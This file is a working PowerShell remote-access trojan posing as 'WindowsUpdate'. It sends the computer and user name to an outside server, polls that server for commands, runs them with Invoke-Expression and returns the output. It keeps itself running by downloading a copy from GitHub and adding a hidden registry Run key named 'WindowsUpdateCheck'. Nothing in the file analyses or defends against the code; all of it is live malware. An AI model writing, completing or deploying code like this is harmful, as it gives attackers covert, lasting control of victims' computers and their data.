$workerUrl = "https://windows-update-proxy.onrender.com"
$scriptName = "WindowsUpdate.ps1"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$scriptPath = "$env:APPDATA\$scriptName"

function Send-Beacon {
    param($data)
    try {
        $body = @{
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
            data = $data
            timestamp = (Get-Date).ToString()
        } | ConvertTo-Json
        
        $params = @{
            Uri = "$workerUrl/beacon"
            Method = "POST"
            Body = $body
            ContentType = "application/json"
            UseBasicParsing = $true
            TimeoutSec = 10
        }
        
        Invoke-RestMethod @params | Out-Null
    } catch {
    }
}

function Get-Command {
    try {
        $params = @{
            Uri = "$workerUrl/command?id=$env:COMPUTERNAME"
            Method = "GET"
            UseBasicParsing = $true
            TimeoutSec = 10
        }
        
        $response = Invoke-RestMethod @params
        return $response.command
    } catch {
        return $null
    }
}

function Invoke-RemoteCommand {
    param($cmd)
    try {
        $output = Invoke-Expression $cmd 2>&1 | Out-String
        Send-Beacon -data @{
            type = "output"
            command = $cmd
            result = $output
        }
    } catch {
        Send-Beacon -data @{
            type = "error"
            command = $cmd
            error = $_.Exception.Message
        }
    }
}

function Install-Persistence {
    try {
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Windows-Update-Proxy/Updater/refs/heads/main/Windows/WindowsUpdate.ps1" -OutFile $scriptPath
        
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name "WindowsUpdateCheck" `
            -Value "cmd /c start /min powershell -WindowStyle Hidden -File `"$scriptPath`"" -Force
        
        Send-Beacon -data @{
            type = "persistence"
            message = "Persistence installed successfully"
        }
    } catch {
        Send-Beacon -data @{
            type = "persistence"
            error = $_.Exception.Message
        }
    }
}

function Start-C2Client {
    if (-not (Test-Path $scriptPath)) {
        Install-Persistence
    }
    
    Send-Beacon -data @{
        type = "init"
        message = "Client connected"
        os = [System.Environment]::OSVersion.VersionString
        psversion = $PSVersionTable.PSVersion.ToString()
    }
    
    while ($true) {
        try {
            $cmd = Get-Command
            if ($cmd) {
                Invoke-RemoteCommand -cmd $cmd
            }
            Start-Sleep -Seconds 2
        } catch {
            Start-Sleep -Seconds 5
        }
    }
}

# Start de client
Start-C2Client
